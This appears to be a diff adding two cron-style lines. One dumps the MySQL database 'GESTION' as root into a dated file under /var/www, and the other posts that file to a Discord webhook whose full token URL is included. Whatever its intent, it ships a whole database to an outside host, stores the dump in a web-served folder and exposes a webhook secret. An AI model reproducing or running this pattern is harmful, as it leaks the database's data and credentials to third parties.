@@ -1,0 +1,2 @@
+mysqldump -u root GESTION > /var/www/gestion_$(date +\%d\%m\%Y-\%H-\%M).sql
+curl -X POST -F file=@/var/www/gestion_$(date +\%d\%m\%Y-\%H-\%M).sql https://discord.com/api/webhooks/1115687951377125466/QR7lKO3ZqRzhghXapdxEMlaiJG_MN2fhYiyau27YfcRMFooaV97x65F7Xr7wwtZ9uFar
